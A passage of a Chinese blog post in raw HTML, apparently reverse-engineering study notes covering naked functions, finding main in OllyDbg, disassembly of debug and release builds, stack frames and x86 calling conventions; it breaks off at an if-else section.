class=\"line\">\t\tpopfd</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用 VS2008 创建一个 win32 application</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108192317976.png\" alt=\"image-20221108192317976\"></p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1654239398565-0af1e19d-f2a4-4772-b49a-495dcdf19dca.png\" alt=\"img\"></p>\n<p>使用多线程 /mt 之后，用户运行时不需要库既可运行，但文件会变大</p>\n<p>编译一个内联函数</p>\n<p>nake 声明一个裸函数，即堆栈的申请释放都需要我们自己进行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int __declspec (naked) Plus()&#123;</span><br><span class=\"line\">                __asm&#123;</span><br><span class=\"line\">\t\t\t\t\t\tpushad</span><br><span class=\"line\">\t\t\t\t\t\txor     eax,eax</span><br><span class=\"line\">\t\t\t\t\t\tcmp     byte ptr ds:[0x4F040],al</span><br><span class=\"line\">\t\t\t\t\t\tretn</span><br><span class=\"line\">\t\t\t\t\t\tpopad</span><br><span class=\"line\">        &#125;        </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tPlus();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>Plus () 对应的汇编代码为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00FC2240 &gt; &gt; \\60            pushad</span><br><span class=\"line\">00FC2241   .  33C0          xor     eax,eax</span><br><span class=\"line\">00FC2243      61            popad                       </span><br></pre></td></tr></table></figure>\n<p>正常的函数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">int Plus()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint x=1+2;</span><br><span class=\"line\">\treturn 1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tPlus();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">003813A0 &gt;  55              push    ebp</span><br><span class=\"line\">003813A1    8BEC            mov     ebp,esp</span><br><span class=\"line\">003813A3    81EC CC000000   sub     esp,0xCC</span><br><span class=\"line\">003813A9    53              push    ebx</span><br><span class=\"line\">003813AA    56              push    esi</span><br><span class=\"line\">003813AB    57              push    edi</span><br><span class=\"line\">003813AC    8DBD 34FFFFFF   lea     edi,dword ptr ss:[ebp-0xCC]</span><br><span class=\"line\">003813B2    B9 33000000     mov     ecx,0x33</span><br><span class=\"line\">003813B7    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">003813BC    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">003813BE    C745 F8 0300000&gt;mov     dword ptr ss:[ebp-0x8],0x3</span><br><span class=\"line\">003813C5    B8 01000000     mov     eax,0x1</span><br><span class=\"line\">003813CA    5F              pop     edi</span><br><span class=\"line\">003813CB    5E              pop     esi</span><br><span class=\"line\">003813CC    5B              pop     ebx</span><br><span class=\"line\">003813CD    8BE5            mov     esp,ebp</span><br><span class=\"line\">003813CF    5D              pop     ebp</span><br><span class=\"line\">003813D0    C3              retn</span><br></pre></td></tr></table></figure>\n<p>正常的函数系统会自动帮我们进行堆栈的操作我们只需要关系自己的代码即可</p>\n<h3 id=\"寻找c程序入口\"><a class=\"markdownIt-Anchor\" href=\"#寻找c程序入口\">#</a> 寻找 C 程序入口</h3>\n<p>为什么能看到 wmain 的名称</p>\n<p>因为有 pdb 文件，od 读取 pdb 读取 debug 信息</p>\n<p>PDB 全称为程序数据库文件，存储了被编译文件的调试信息，一般用在调式程序中</p>\n<p>1. 找到 wmainCRTStartup</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108210348946.png\" alt=\"image-20221108210348946\"></p>\n<p>2. 找到__tmainCRTStartup</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108210432400.png\" alt=\"image-20221108210432400\"></p>\n<p>3. 这个 call 002C108C 就是我们的 main 函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">002C260E   .  FF35 70F02D00 push    dword ptr ds:[__wargv]</span><br><span class=\"line\">002C2614   .  FF35 68F02D00 push    dword ptr ds:[__argc]</span><br><span class=\"line\">002C261A   .  E8 6DEAFFFF   call    002C108C</span><br></pre></td></tr></table></figure>\n<p>4.wmain 就是我们的 main 函数</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108210639094.png\" alt=\"image-20221108210639094\"></p>\n<blockquote>\n<p>mainCRTStartup 和 wmainCRTStartup 是控制台环境下多字节编码和 Unicode 编码的启动函数</p>\n<p>而 WinMainCRTStartup 和 wWinMainCRTStartup 是 windows 环境下多字节编码和 Unicode 编码的启动函数</p>\n<p>mainCRTStartup 做了哪些事：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108210737730.png\" alt=\"image-20221108210737730\"></p>\n<ol>\n<li>前面我们已经知道了 mainCRTStartup 也就是程序入口，那么如何通过 mainCRTStartup 来找到 main 函数入口</li>\n<li>根据函数的参数来进行判断</li>\n<li>main 函数貌似只有两个参数，但实际上 main 函数一共有三个参数，只不过一般第三个参数我们并没有用到，于是在使用 main 函数时并没有加上，完整的 main 函数原型如下:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int main(int argc,char *argv[],char *envp[])&#123;&#125;</span><br></pre></td></tr></table></figure>\n<p>这里的 argv 和 envp 对应 mainCRTStartup 里_setargv () 和_setenvp ()</p>\n<p>main 中参数</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108210850705.png\" alt=\"image-20221108210850705\"></p>\n</blockquote>\n<p>另一种歪门邪道：</p>\n<p>找一个有标示性的断点</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221111213357060.png\" alt=\"image-20221111213357060\"></p>\n<p>下断，跳转到断点，F9 执行到断点</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221111213436905.png\" alt=\"image-20221111213436905\"></p>\n<p>在堆栈窗口中选中，enter 建进入 main</p>\n<p>或者在有 printf 或者 MessageBox 时可以 F9   CTRL+F9</p>\n<h3 id=\"调试方式\"><a class=\"markdownIt-Anchor\" href=\"#调试方式\">#</a> 调试方式</h3>\n<p>1.OD 直接打开</p>\n<p>2. 附加到已经打开的进程</p>\n<h3 id=\"od常用操作\"><a class=\"markdownIt-Anchor\" href=\"#od常用操作\">#</a> OD 常用操作</h3>\n<p>F9 程序运行到所设断点处</p>\n<p>F2 设置软件断点</p>\n<p>ALT+C 初始页面</p>\n<p>bp  指令地址    设置软件断点</p>\n<p>bc 清除断点</p>\n<p>dd ecx / 内存地址  查看 ecx 寄存器，寄存器中值 以双字显示</p>\n<p>dw 以字显示</p>\n<p>db 以字节显示</p>\n<p>dc 以字符串显示数据</p>\n<p>? 计算表达式</p>\n<p>F8 单步步过</p>\n<p>F7 单步步入</p>\n<p>CTRL + F9  执行到返回</p>\n<p>ALT + F9 执行到用户代码</p>\n<p>CTRL+F2 重新开始</p>\n<p>转到地址 Ctrl +G</p>\n<p>断点窗口 Alt +B</p>\n<p><code>-</code>  到上一步</p>\n<p><code>* </code> 转到当前指令地址</p>\n<p><code>+</code>  转到下一步</p>\n<p>选中汇编，按空格，输入汇编代码</p>\n<h3 id=\"函数调用\"><a class=\"markdownIt-Anchor\" href=\"#函数调用\">#</a> 函数调用</h3>\n<p>注意先关闭 c/c++ 优化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">int add(int a, int b)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\treturn a+b;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int aaa=1;</span><br><span class=\"line\"></span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tMessageBox(0,NULL,NULL,MB_OK);</span><br><span class=\"line\">\taaa = add(3,4);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"release\"><a class=\"markdownIt-Anchor\" href=\"#release\">#</a> release</h4>\n<p>优化的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00371000 &gt;/$  6A 00         push    0x0                              ; /Style = MB_OK|MB_APPLMODAL</span><br><span class=\"line\">00371002  |.  6A 00         push    0x0                              ; |Title = NULL</span><br><span class=\"line\">00371004  |.  6A 00         push    0x0                              ; |Text = NULL</span><br><span class=\"line\">00371006  |.  6A 00         push    0x0                              ; |hOwner = NULL</span><br><span class=\"line\">00371008  |.  FF15 A4203700 call    dword ptr ds:[&lt;&amp;USER32.MessageBo&gt;; \\MessageBoxW</span><br><span class=\"line\">0037100E  |.  C705 18303700&gt;mov     dword ptr ds:[aaa],0x7</span><br><span class=\"line\">00371018  |.  33C0          xor     eax,eax</span><br><span class=\"line\">0037101A  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<p>未被优化的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">012B1010 &gt;/$  55            push    ebp</span><br><span class=\"line\">012B1011  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">012B1013  |.  6A 00         push    0x0                                            ; /Style = MB_OK|MB_APPLMODAL</span><br><span class=\"line\">012B1015  |.  6A 00         push    0x0                                            ; |Title = NULL</span><br><span class=\"line\">012B1017  |.  6A 00         push    0x0                                            ; |Text = NULL</span><br><span class=\"line\">012B1019  |.  6A 00         push    0x0                                            ; |hOwner = NULL</span><br><span class=\"line\">012B101B  |.  FF15 E4802B01 call    dword ptr ds:[&lt;&amp;USER32.MessageBoxW&gt;]           ; \\MessageBoxW</span><br><span class=\"line\">012B1021  |.  6A 04         push    0x4</span><br><span class=\"line\">012B1023  |.  6A 03         push    0x3</span><br><span class=\"line\">012B1025  |.  E8 D6FFFFFF   call    add</span><br><span class=\"line\">012B102A  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">012B102D  |.  A3 40AC2B01   mov     dword ptr ds:[aaa],eax</span><br><span class=\"line\">012B1032  |.  33C0          xor     eax,eax</span><br><span class=\"line\">012B1034  |.  5D            pop     ebp</span><br><span class=\"line\">012B1035  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<p>如果我们此时将代码改为如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">int add(int a, int b)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\treturn a+b;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int aaa=1;</span><br><span class=\"line\"></span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tMessageBox(0,NULL,NULL,MB_OK);</span><br><span class=\"line\">\taaa = add(aaa,4);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00EB13F0 &gt;  55              push    ebp</span><br><span class=\"line\">00EB13F1    8BEC            mov     ebp,esp</span><br><span class=\"line\">00EB13F3    81EC C0000000   sub     esp,0xC0</span><br><span class=\"line\">00EB13F9    53              push    ebx</span><br><span class=\"line\">00EB13FA    56              push    esi</span><br><span class=\"line\">00EB13FB    57              push    edi</span><br><span class=\"line\">00EB13FC    8DBD 40FFFFFF   lea     edi,dword ptr ss:[ebp-0xC0]</span><br><span class=\"line\">00EB1402    B9 30000000     mov     ecx,0x30</span><br><span class=\"line\">00EB1407    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00EB140C    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00EB140E    8BF4            mov     esi,esp</span><br><span class=\"line\">00EB1410    6A 00           push    0x0</span><br><span class=\"line\">00EB1412    6A 00           push    0x0</span><br><span class=\"line\">00EB1414    6A 00           push    0x0</span><br><span class=\"line\">00EB1416    6A 00           push    0x0</span><br><span class=\"line\">00EB1418    FF15 3883EB00   call    dword ptr ds:[&lt;&amp;USER32.MessageBoxW&gt;]    ; user32.MessageBoxW</span><br><span class=\"line\">00EB141E    3BF4            cmp     esi,esp</span><br><span class=\"line\">00EB1420    E8 25FDFFFF     call    00EB114A</span><br><span class=\"line\">00EB1425    6A 04           push    0x4</span><br><span class=\"line\">00EB1427    A1 0070EB00     mov     eax,dword ptr ds:[aaa]</span><br><span class=\"line\">00EB142C    50              push    eax</span><br><span class=\"line\">00EB142D    E8 69FCFFFF     call    00EB109B</span><br><span class=\"line\">00EB1432    83C4 08         add     esp,0x8</span><br><span class=\"line\">00EB1435    A3 0070EB00     mov     dword ptr ds:[aaa],eax</span><br><span class=\"line\">00EB143A    33C0            xor     eax,eax</span><br><span class=\"line\">00EB143C    5F              pop     edi</span><br><span class=\"line\">00EB143D    5E              pop     esi</span><br><span class=\"line\">00EB143E    5B              pop     ebx</span><br><span class=\"line\">00EB143F    81C4 C0000000   add     esp,0xC0</span><br><span class=\"line\">00EB1445    3BEC            cmp     ebp,esp</span><br><span class=\"line\">00EB1447    E8 FEFCFFFF     call    00EB114A</span><br><span class=\"line\">00EB144C    8BE5            mov     esp,ebp</span><br><span class=\"line\">00EB144E    5D              pop     ebp</span><br><span class=\"line\">00EB144F    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00EB13B0 &gt;  55              push    ebp</span><br><span class=\"line\">00EB13B1    8BEC            mov     ebp,esp</span><br><span class=\"line\">00EB13B3    81EC C0000000   sub     esp,0xC0</span><br><span class=\"line\">00EB13B9    53              push    ebx</span><br><span class=\"line\">00EB13BA    56              push    esi</span><br><span class=\"line\">00EB13BB    57              push    edi</span><br><span class=\"line\">00EB13BC    8DBD 40FFFFFF   lea     edi,dword ptr ss:[ebp-0xC0]</span><br><span class=\"line\">00EB13C2    B9 30000000     mov     ecx,0x30</span><br><span class=\"line\">00EB13C7    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00EB13CC    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00EB13CE    8B45 08         mov     eax,dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">00EB13D1    0345 0C         add     eax,dword ptr ss:[ebp+0xC]</span><br><span class=\"line\">00EB13D4    5F              pop     edi                                     ; 0038FB84</span><br><span class=\"line\">00EB13D5    5E              pop     esi</span><br><span class=\"line\">00EB13D6    5B              pop     ebx</span><br><span class=\"line\">00EB13D7    8BE5            mov     esp,ebp</span><br><span class=\"line\">00EB13D9    5D              pop     ebp</span><br><span class=\"line\">00EB13DA    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"进制与内存单元长度修饰\"><a class=\"markdownIt-Anchor\" href=\"#进制与内存单元长度修饰\">#</a> 进制与内存单元长度修饰</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add [ebx],0x333</span><br><span class=\"line\">然在实际汇编出来： add byte ptr [ebx], 33</span><br><span class=\"line\"></span><br><span class=\"line\">eax是双字</span><br><span class=\"line\">内存单元访问，默认byte</span><br><span class=\"line\">因此会截断</span><br></pre></td></tr></table></figure>\n<h3 id=\"补充\"><a class=\"markdownIt-Anchor\" href=\"#补充\">#</a> 补充</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int a = 0x109     //a = local.1</span><br><span class=\"line\">int b = 8         //b = local.2</span><br><span class=\"line\"></span><br><span class=\"line\">sub 会影响zf</span><br><span class=\"line\"></span><br><span class=\"line\">je/jz 如果zf=1跳转</span><br><span class=\"line\">jne/jnz</span><br><span class=\"line\"></span><br><span class=\"line\">__asm &#123;</span><br><span class=\"line\">\tmob eax,3</span><br><span class=\"line\">\tsub eax,a</span><br><span class=\"line\">\tjz end</span><br><span class=\"line\">end:</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">无符号JL/JNGE  小于/不大于等于跳转 根据sf，of跳转</span><br><span class=\"line\">有符号JNG/JLE  不大于/小于等于  sf=1||zf=1|||OF=1      ZF=1 || sf!=of</span><br><span class=\"line\">有符号JG/JNLE  大于/不小于等于   ZF=0 &amp;&amp; SF=OF</span><br><span class=\"line\">无符号JA/JG  无符号大于</span><br><span class=\"line\">无符号JBE/JNA 小于等于/大于</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221115213554357.png\" alt=\"image-20221115213554357\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221115213632575.png\" alt=\"image-20221115213632575\"></p>\n<blockquote>\n<p>EBP 栈底指针 base pointer</p>\n<p>ESP 栈顶指针</p>\n<p>EBP  -/+ 偏移量可以访问 call 里的局部变量</p>\n<p>ESP 栈顶指针与 EBP 构成了一段空间，一般就是本 call 局部变量的空间大小总和</p>\n<p>空函数中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push ebp   //保存上一个函数的栈底，上一个函数的栈顶就是新的ebp，即原来的esp</span><br><span class=\"line\">mov ebp,esp  //确定新的栈底</span><br><span class=\"line\">pop ebp</span><br><span class=\"line\">ret</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221116195359372.png\" alt=\"image-20221116195359372\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221116200409461.png\" alt=\"image-20221116200409461\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int a = 3</span><br><span class=\"line\">int b = 5</span><br><span class=\"line\">char c = 1</span><br><span class=\"line\"></span><br><span class=\"line\">char s[17]  //如果微软编译器可能会多分配几个字节防止数组越界导致程序崩溃</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sub esp,0C   //0c因为内存对齐</span><br><span class=\"line\">mov dword ptr [local.1],3   //local.1 == ebp-4</span><br><span class=\"line\">mov dword ptr [local.2],5   //local.2 == ebp-4</span><br><span class=\"line\">mov byte ptr [local.3+3],1 //local.3 == ebp+3   //因为只使用了一个字节，从顶往下减少三个</span><br><span class=\"line\">mov esp,ebp</span><br><span class=\"line\">pop ebp</span><br><span class=\"line\">ret</span><br></pre></td></tr></table></figure>\n<p>每个 call 分配独立的栈段空间，供局部变量使用</p>\n<p>call 平衡，pop 后 ebp 和 esp 不变</p>\n<p>栈的上面小，下面大</p>\n<p>push ebp      //sub esp,4  mov esp,[ebp]</p>\n<p>pop ebp       //mov ebp,[esp] add esp,4</p>\n<p>参数入栈又右向左入栈</p>\n<p>ecx 放 this 指针，eax 放返回值</p>\n<p>call 执行 push eIP</p>\n<p>retn pop eip</p>\n<p>32 位内存中，EIP (32 位) 已经能表达所有内存地址。而 16 位系统中的内存地址是 20 位，所以需要 IP 和 CS 同时入栈</p>\n<p><strong>参数局部变量的表示   [EBP - x] 本 call 中的局部变量      [EBP+x] 上一个 call 的局部变量作为传入参数</strong></p>\n<p>[ebp +4] 是父函数 EBP 的值，[EBP+8] 大概率是外部传进来的参数值</p>\n<p>调用约定：</p>\n<p>​\t__cdecl 是 c declaration 缩写，所有参数从右到左依次入栈，这些参数由调用者清除，称为手动清栈，即清栈是在 call 后面   call 0010000h   add esp+x   VC 默认约定</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int __cdecl add(int a, int b)</span><br></pre></td></tr></table></figure>\n<p>​\t__stdcall api 函数调用约定，是 c++ 标准调用方式，所有参数从右到左依次入栈，如果调用类成员，最后一个入栈的是 this 指针，这些堆栈由被调用者在返回后清除，retx，x 代表参数占用字节数，cpu 在 ret 之后自动弹出 x 个栈空间，称为自动清栈</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int __stdcall add2(int a, int b)</span><br></pre></td></tr></table></figure>\n<p>​\t__fastcall 调用约定，是编译器指定的快速调用方式。fastcall 规定将前两个 (若干个参数由寄存器传递，其余参数通过堆栈传递)，返回方式和 stdcall 一样，如果只有两个参数，不用栈，不需要堆栈平衡，如果有很多参数，还需要用堆栈平衡部分堆栈</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int __fastcall add3(int a, int b)</span><br></pre></td></tr></table></figure>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221116223933037.png\" alt=\"image-20221116223933037\" style=\"zoom: 67%;\" />\n<p>c 中不加默认说明为_cedcl 方式，c++ 也一样，默认调用方式可以在 ide 中设置</p>\n<p>带有可变参数的函数必须使用_cdecl 方式，比如 printf (char *fmtstr, …) scanf</p>\n</blockquote>\n<h4 id=\"if-else\"><a class=\"markdownIt-Anchor\" href=\"#if-else\">#</a> if-else</h4>\n<blockquote>\n<p><strong>if-else:</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span 